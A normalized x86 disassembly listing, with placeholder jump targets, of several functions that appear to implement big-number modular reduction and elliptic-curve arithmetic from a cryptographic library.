mov [ esp + 0x3c ] edx
call sub_100537d0
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x40 ]
sub esi eax
mov eax [ esp + 0x44 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x20 ]
push 0x8
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x4c ]
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x54 ]
push eax
push ebx
push ebx
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] ebp
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] edx
call sub_100537d0
mov edx [ esp + 0x54 ]
mov ecx [ esp + 0x6c ]
mov [ esp + 0x3c ] edx
lea edx [ esp + 0x30 ]
push 0x8
sub esi eax
mov eax [ esp + 0x5c ]
mov [ esp + 0x34 ] ebp
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x60 ]
push edx
xor ebp ebp
push ebx
push ebx
mov [ esp + 0x48 ] ebp
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] ecx
mov [ esp + 0x58 ] ebp
mov [ esp + 0x5c ] edi
call sub_100537d0
sub esi eax
add esp 0x30
cmp esi ebp
mov edi sub_100537d0
jle r-xdata
mov esi [ ecx + eax ]
mov [ eax ] esi
add eax 0x4
dec edx
jne r-xdata
jmp r-xdata
jge r-xdata
shl esi 0x5
push 0x8
lea eax [ esi + r--data ]
push eax
push ebx
push ebx
call sub_100537d0
add esp 0x10
mov esi eax
jmp r-xdata
mov edx [ esp + 0x78 ]
lea edi [ esp + 0x30 ]
lea esi [ ebp + 0x20 ]
lea eax [ edx - 0x8 ]
xor edx edx
cmp eax edx
je r-xdata
mov esi 0x1
inc esi
mov ecx r--data
shl esi 0x5
sub ecx esi
push 0x8
push ecx
push ebx
push ebx
call sub_100536c0
mov esi eax
add esp 0x10
neg eax
mov edi eax
and eax sub_100537d0
not edi
and edi sub_100536c0
or edi eax
jmp r-xdata
push 0x8
push r--data
lea edx [ esp + 0x58 ]
push ebx
push edx
call edi
neg eax
neg esi
and eax esi
lea edx [ esp + 0x60 ]
mov ecx eax
and eax ebx
not ecx
and ecx edx
add esp 0x10
or ecx eax
mov eax 0x8
sub ecx ebx
mov edx [ ecx + ebx ]
mov [ ebx ] edx
add ebx 0x4
dec eax
jne r-xdata
mov eax [ esp + 0x74 ]
mov ecx [ eax ]
mov [ eax + 0x4 ] 0x8
add ecx 0x1c
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x60
retn
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
cmp edx ebp
jg r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
sub_10064e60
mov eax 0x94
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0xa8 ]
xor ebx ebx
push edi
mov eax [ esi + 0x4 ]
mov ebp [ esi ]
mov [ esp + 0x70 ] eax
mov eax [ esi + 0xc ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0xb4 ]
mov ecx [ esp + 0xa8 ]
push eax
push r--data
push esi
push ecx
call sub_100579b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn
push r--data
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
push esi
push r--data
call sub_10029fb0
add esp 0x8
cmp eax ebx
jne r-xdata
jle r-xdata
mov ecx [ esp + 0xa8 ]
push ebx
push ecx
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn
mov edi [ esp + 0xa8 ]
cmp edi esi
je r-xdata
mov eax [ esp + 0xa8 ]
cmp eax esi
jne r-xdata
mov esi ebp
cmp [ edi + 0x8 ] 0xc
jl r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x94
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x94
retn
mov ecx 0xc
sub ecx edx
je r-xdata
lea ecx [ esp + 0x40 ]
sub eax ecx
mov ecx edx
push 0xc
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
mov edx [ esp + 0x64 ]
mov ecx [ esp + 0x6c ]
mov eax [ esp + 0x68 ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
lea ecx [ esp + 0x10 ]
xor edx edx
mov edi 0x3
xor eax eax
[ edi ]
mov ebp [ eax + edi ]
mov [ edi ] ebp
add edi 0x4
dec ecx
jne r-xdata
mov esi [ edi ]
mov ecx ebp
mov eax esi
sub ecx esi
mov edx 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x94
retn
cmp eax ebx
jne r-xdata
mov eax [ ecx ]
add ecx 0x4
lea ebp [ eax + eax ]
or ebp edx
mov [ ecx - 0x4 ] ebp
shr eax 0x1f
dec edi
mov edx eax
jne r-xdata
mov [ ecx ] edx
lea edx [ esp + 0x10 ]
lea eax [ esi + 0x10 ]
push 0x8
push edx
push eax
push eax
call sub_100536c0
mov edi eax
lea eax [ esp + 0x50 ]
push 0xc
push eax
push esi
push esi
call sub_100536c0
mov ecx [ esp + 0x84 ]
mov edx [ esp + 0x88 ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x60 ]
add edi eax
mov eax [ esp + 0x8c ]
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x6c ]
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x64 ]
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x48 ] ecx
mov ecx [ esp + 0x78 ]
mov [ esp + 0x40 ] edx
mov edx [ esp + 0x70 ]
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x54 ] ecx
lea ecx [ esp + 0x30 ]
push 0xc
mov [ esp + 0x50 ] edx
mov edx [ esp + 0x80 ]
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x84 ]
push ecx
push esi
push esi
mov [ esp + 0x68 ] edx
mov [ esp + 0x6c ] eax
call sub_100536c0
mov edx [ esp + 0x9c ]
mov ecx [ esp + 0x70 ]
add edi eax
mov eax [ esp + 0x90 ]
mov [ esp + 0x4c ] eax
mov eax [ esp + 0x78 ]
mov [ esp + 0x44 ] edx
mov edx [ esp + 0x74 ]
mov [ esp + 0x58 ] eax
mov eax [ esp + 0x84 ]
mov [ esp + 0x50 ] ecx
mov ecx [ esp + 0x7c ]
mov [ esp + 0x54 ] edx
mov edx [ esp + 0x80 ]
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x40 ]
push 0xc
mov [ esp + 0x60 ] ecx
mov ecx [ esp + 0x8c ]
mov [ esp + 0x64 ] edx
mov edx [ esp + 0x90 ]
push eax
push esi
push esi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x78 ] ecx
mov [ esp + 0x7c ] edx
call sub_100536c0
add esp 0x40
add edi eax
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov edx [ esp + 0x64 ]
mov ecx [ esp + 0x60 ]
mov eax [ esp + 0x68 ]
mov [ esp + 0x24 ] edx
lea edx [ esp + 0x10 ]
push 0xc
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x70 ]
push edx
push esi
push esi
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
call sub_100536c0
mov ecx [ esp + 0x74 ]
mov edx [ esp + 0x78 ]
add edi eax
mov eax [ esp + 0x70 ]
mov [ esp + 0x2c ] ecx
lea ecx [ esp + 0x20 ]
push 0xc
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x80 ]
push ecx
push esi
push esi
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x40 ] edx
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
call sub_100536c0
mov edx [ esp + 0x8c ]
mov ecx [ esp + 0x64 ]
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x68 ]
add edi eax
mov eax [ esp + 0x60 ]
mov [ esp + 0x3c ] edx
mov edx [ esp + 0x74 ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x6c ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x70 ]
mov [ esp + 0x48 ] edx
mov edx [ esp + 0x80 ]
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x78 ]
mov [ esp + 0x44 ] ecx
mov ecx [ esp + 0x7c ]
mov [ esp + 0x54 ] edx
lea edx [ esp + 0x30 ]
push 0xc
mov [ esp + 0x50 ] eax
mov eax [ esp + 0x88 ]
mov [ esp + 0x54 ] ecx
mov ecx [ esp + 0x8c ]
push edx
push esi
push esi
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] ecx
call sub_100537d0
mov ecx [ esp + 0x94 ]
mov edx [ esp + 0x98 ]
sub edi eax
mov eax [ esp + 0x90 ]
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x9c ]
mov [ esp + 0x40 ] ebx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x4c ] edx
lea ecx [ esp + 0x40 ]
push 0xc
push ecx
push esi
push esi
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] ebx
mov [ esp + 0x7c ] ebx
call sub_100537d0
add esp 0x40
lea edx [ esp + 0x10 ]
sub edi eax
mov eax [ esp + 0x6c ]
push 0xc
push edx
push esi
push esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
call sub_100537d0
sub edi eax
add esp 0x10
cmp edi ebx
mov ebp sub_100537d0
jle r-xdata
mov edi [ ecx + eax ]
mov [ eax ] edi
add eax 0x4
dec edx
jne r-xdata
jmp r-xdata
jge r-xdata
lea eax [ edi + edi * 2 ]
push 0xc
shl eax 0x4
lea ecx [ eax + r--data ]
push ecx
push esi
push esi
call sub_100537d0
add esp 0x10
mov edi eax
jmp r-xdata
mov edx [ esp + 0x70 ]
lea edi [ esp + 0x40 ]
add edx 0xfffffff4
lea eax [ ebp + 0x30 ]
cmp edx ebx
je r-xdata
mov edi 0x1
lea edx [ edi + edi * 2 + 0x3 ]
mov eax r--data
shl edx 0x4
sub eax edx
push 0xc
push eax
push esi
push esi
call sub_100536c0
mov edi eax
add esp 0x10
neg eax
mov ebp eax
and eax sub_100537d0
not ebp
and ebp sub_100536c0
or ebp eax
jmp r-xdata
push 0xc
push r--data
lea ecx [ esp + 0x7c ]
push esi
push ecx
call ebp
neg eax
neg edi
and eax edi
lea edx [ esp + 0x84 ]
mov ecx eax
and eax esi
not ecx
and ecx edx
add esp 0x10
or ecx eax
mov eax 0xc
sub ecx esi
mov edx [ ecx + esi ]
mov [ esi ] edx
add esi 0x4
dec eax
jne r-xdata
mov eax [ esp + 0xa8 ]
mov ecx [ eax ]
mov [ eax + 0x4 ] 0xc
add ecx 0x2c
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x94
retn
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
cmp edx ebx
jg r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
sub_100653c0
mov eax 0x44
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x58 ]
push edi
mov eax [ esi + 0x4 ]
mov ebp [ esi ]
mov [ esp + 0x5c ] eax
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x64 ]
mov eax [ esp + 0x58 ]
push edx
push r--data
push esi
push eax
call sub_100579b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
push r--data
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
push esi
push r--data
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
jle r-xdata
mov ecx [ esp + 0x58 ]
push eax
push ecx
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov ebx [ esp + 0x58 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0x58 ]
cmp eax esi
jne r-xdata
mov esi ebp
cmp [ ebx + 0x8 ] 0x11
jl r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x44
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn
mov ecx 0x11
sub ecx edx
je r-xdata
lea ecx [ esp + 0x10 ]
sub eax ecx
mov ecx edx
push 0x11
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x10 ]
mov edi 0x10
xor eax eax
[ edi ]
mov ebp [ eax + edi ]
mov [ edi ] ebp
add edi 0x4
dec ecx
jne r-xdata
mov esi [ ebx ]
mov ecx ebp
mov eax esi
sub ecx esi
mov edx 0x11
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
test eax eax
jne r-xdata
mov edx eax
mov eax [ ecx + 0x4 ]
mov ebp eax
add ecx 0x4
shr edx 0x9
shl ebp 0x17
or ebp edx
dec edi
mov [ ecx - 0x4 ] ebp
jne r-xdata
shr eax 0x9
mov [ esp + 0x50 ] eax
mov ecx [ esi + 0x40 ]
lea edx [ esp + 0x10 ]
push 0x11
push edx
and ecx 0x1ff
push esi
push esi
mov [ esi + 0x40 ] ecx
call sub_100536c0
push 0x11
push r--data
lea eax [ esp + 0x28 ]
push esi
push eax
call sub_100537d0
neg eax
mov ecx eax
lea edi [ esp + 0x30 ]
not ecx
and ecx edi
and eax esi
or ecx eax
add esp 0x20
mov edx esi
sub ecx esi
mov eax 0x11
mov edi [ ecx + eax ]
mov [ eax ] edi
add eax 0x4
dec edx
jne r-xdata
jmp r-xdata
mov esi [ ecx + edx ]
mov [ edx ] esi
add edx 0x4
dec eax
jne r-xdata
mov eax [ ebx ]
mov [ ebx + 0x4 ] 0x11
add eax 0x40
mov edx [ esp + 0x5c ]
lea edi [ esp + 0x10 ]
add edx 0xfffffff0
lea eax [ ebp + 0x40 ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn
mov edx [ ebx + 0x4 ]
dec edx
mov ecx edx
mov [ ebx + 0x4 ] edx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
sub eax 0x4
test ecx ecx
jne r-xdata
sub_100655a0
mov eax 0x8
call sub_1001d0d0
push ebp
mov ebp [ esp + 0x28 ]
push esi
xor esi esi
cmp ebp esi
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] esi
jne r-xdata
push ebx
mov ebx [ esp + 0x20 ]
push edi
mov edi [ esp + 0x28 ]
cmp ebx esi
mov esi [ esp + 0x1c ]
je r-xdata
call sub_1002dc50
cmp eax esi
mov [ esp + 0xc ] eax
mov ebp eax
jne r-xdata
cmp edi 0x2
ja r-xdata
cmp edi 0x1
ja r-xdata
pop esi
xor eax eax
pop ebp
add esp 0x8
retn
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x20 ]
push ebp
push edx
push eax
push edi
push ebx
push ecx
push esi
call sub_1004d990
add esp 0x1c
mov [ esp + 0x10 ] eax
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
test eax eax
pop ebx
je r-xdata
push esi
call sub_1002d150
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push esi
call sub_1002dc20
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
pop esi
pop ebp
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x20 ]
push eax
push esi
call sub_1002d410
add esp 0x8
test eax eax
je r-xdata
push edi
call sub_1002d200
add esp 0x4
test ebx ebx
je r-xdata
mov eax [ esp + 0x28 ]
mov [ esp + 0x34 ] 0x0
test eax eax
jbe r-xdata
mov ecx [ esi + 0x4 ]
push ebp
push ecx
push ebx
push edi
push esi
call sub_10065750
add esp 0x14
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov ebx [ esp + 0x30 ]
mov eax [ esp + 0x2c ]
sub eax ebx
mov [ esp + 0x30 ] eax
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ eax + ebx ]
mov eax [ ebx ]
push ebp
push edx
push eax
push edi
push esi
call sub_10065750
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esi ]
push ebp
push edi
push eax
push eax
push esi
call [ ecx + 0x54 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esi ]
push ebp
push edi
push esi
call [ edx + 0x5c ]
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebx ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esi ]
push ebp
push edi
push eax
push eax
push esi
call [ ecx + 0x54 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esi ]
push ebp
push edi
push esi
call [ edx + 0x5c ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x28 ]
inc eax
add ebx 0x4
cmp eax ecx
mov [ esp + 0x34 ] eax
jb r-xdata
mov eax [ esp + 0x30 ]
sub_10065750
mov eax 0x14
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x20 ]
push esi
push edi
mov edi [ esp + 0x30 ]
mov [ esp + 0x1c ] 0x0
cmp ebx edi
jne r-xdata
mov eax [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
test eax eax
je r-xdata
push 0xe0
push r--data
push 0x70
push 0xd0
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x14
retn
push ebx
push esi
call sub_1002d410
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
push edi
push esi
call sub_1002d980
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0x40 ]
test eax eax
jne r-xdata
mov edi [ esp + 0x34 ]
push ebp
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov [ esp + 0x1c ] eax
call sub_1002de70
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x14
retn
push edi
call sub_1002de00
mov eax [ esp + 0x24 ]
add esp 0x4
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x34 ]
lea eax [ ebx + 0x4 ]
mov [ esp + 0x28 ] eax
lea edx [ esi + 0x5c ]
lea eax [ ecx + 0x4 ]
push edx
mov [ esp + 0x18 ] eax
push eax
mov eax [ esp + 0x18 ]
add ebx 0x18
push eax
call sub_10065fd0
add esp 0xc
test eax eax
je r-xdata
push 0x1
push ebp
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esi ]
push edi
push edx
push ebx
push esi
call [ ecx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
push edi
push ebx
push ecx
push esi
call [ eax + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esi + 0x84 ]
push edx
push eax
push eax
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
mov ecx 0x80000000
mov [ esp + 0x38 ] 0x1f
mov eax [ edx + 0x4 ]
mov edx [ edx ]
dec eax
mov [ esp + 0x1c ] eax
mov edx [ edx + eax * 4 ]
test ecx edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov edx [ esp + 0x38 ]
shr ecx 0x1
dec edx
mov [ esp + 0x18 ] ecx
test ecx ecx
mov [ esp + 0x38 ] edx
jne r-xdata
mov edx [ esp + 0x38 ]
shr ecx 0x1
dec edx
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x18 ]
test ecx edx
je r-xdata
test eax eax
jl r-xdata
dec eax
mov [ esp + 0x18 ] 0x80000000
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x38 ] 0x1f
mov edx [ esp + 0x34 ]
mov eax [ ebp + 0x4 ]
add edx 0x18
mov [ esp + 0x18 ] 0x0
test eax eax
mov [ esp + 0x34 ] edx
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x28 ]
push 0x0
push eax
call sub_10029cf0
push 0x0
push ebx
call sub_10029cf0
add esp 0x10
jmp r-xdata
mov edx [ esp + 0x38 ]
test edx edx
jl r-xdata
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov [ esp + 0x44 ] eax
call sub_1002de70
push edi
mov [ esp + 0x40 ] eax
call sub_1002de70
add esp 0x10
mov [ esp + 0x1c ] eax
test eax eax
je r-xdata
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
push esi
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
push edx
push esi
call sub_1002d410
add esp 0x8
test eax eax
je r-xdata
dec eax
mov [ esp + 0x38 ] 0x1f
mov [ esp + 0x18 ] 0x80000000
mov [ esp + 0x1c ] eax
jns r-xdata
jmp r-xdata
mov ebp [ esp + 0x18 ]
push 0x1
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
push edx
push esi
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x30 ]
push edi
mov edx [ edx ]
test [ edx + eax * 4 ] ecx
je r-xdata
cmp ebp 0x1
jne r-xdata
mov ecx [ esp + 0x38 ]
mov eax [ esi ]
push edi
push ebx
push ebp
push ecx
push esi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov esi [ esp + 0x2c ]
push 0x1
lea eax [ esi + 0x2c ]
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
push 0x0
push ecx
call sub_1002a190
push 0x0
push ebx
call sub_1002a190
add esp 0x10
mov [ esp + 0x20 ] 0x1
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
push ebp
push ecx
push ebx
push edx
push eax
push esi
call sub_10065de0
add esp 0x1c
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push ebx
push eax
push ebp
push ecx
push edx
push esi
call sub_10065de0
add esp 0x1c
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esi ]
push edi
push eax
push ebp
push ebp
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov [ esi + 0x40 ] 0x1
mov ecx [ esp + 0x10 ]
push edi
push ebp
push ecx
push esi
call sub_10065cf0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
push edi
push ebx
push eax
push esi
call sub_10065cf0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x38 ]
shr ecx 0x1
dec eax
mov [ esp + 0x18 ] ecx
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x1c ]
jns r-xdata
jmp r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esi ]
push edi
push eax
push ebx
push ebx
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
mov ecx [ esi ]
push edi
push eax
push ebx
push eax
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
push edx
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
push edi
push ebp
push ebx
push ebx
push esi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov ebp [ esp + 0x30 ]
mov ecx [ esi ]
push edi
push edx
push ebp
push esi
call [ ecx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
push eax
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov ebp [ esp + 0x38 ]
mov eax [ esp + 0x30 ]
mov ecx [ esi ]
push edi
push ebp
push eax
push eax
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
push ebx
push eax
push eax
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esi ]
push edi
push eax
push ebp
push ebp
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ esi ]
push edi
push ebp
push edx
push ebp
push esi
call [ ecx + 0x88 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esi ]
push edi
push eax
push ebp
push eax
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esi ]
push edi
push ebp
mov ebp [ esp + 0x30 ]
push eax
push ebp
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push ebp
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
mov edx [ esi ]
push edi
push eax
push ebx
push ebx
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x34 ]
push ecx
push ebx
push ebx
call sub_10065f30
add esp 0xc
mov ebp 0x2
test eax eax
jne r-xdata
push edi
call sub_1002de00
add esp 0x4
test ebp ebp
je r-xdata
sub_10065cf0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
mov [ esp + 0x10 ] 0x0
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push edi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
push edi
push ebp
mov eax [ esi ]
push ebp
push esi
call [ eax + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esi ]
push edi
push edx
push ebx
push esi
call [ ecx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esi ]
push edi
push ebx
push ebp
push ecx
push esi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esi ]
push edi
push ebp
push ebp
push esi
call [ edx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi ]
push edi
push ebx
push ebx
push esi
call [ eax + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esi ]
push edi
lea edx [ esi + 0x84 ]
push ebx
push edx
push ebx
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
push ebx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
sub_10065de0
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x34 ]
mov [ esp + 0x10 ] 0x0
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov esi eax
push edi
mov [ esp + 0x20 ] esi
call sub_1002de70
add esp 0xc
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
push edi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x20 ]
push eax
push esi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
mov esi [ esp + 0x1c ]
mov ebp [ esp + 0x24 ]
push edi
mov ecx [ esi ]
push edx
push ebp
push ebp
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
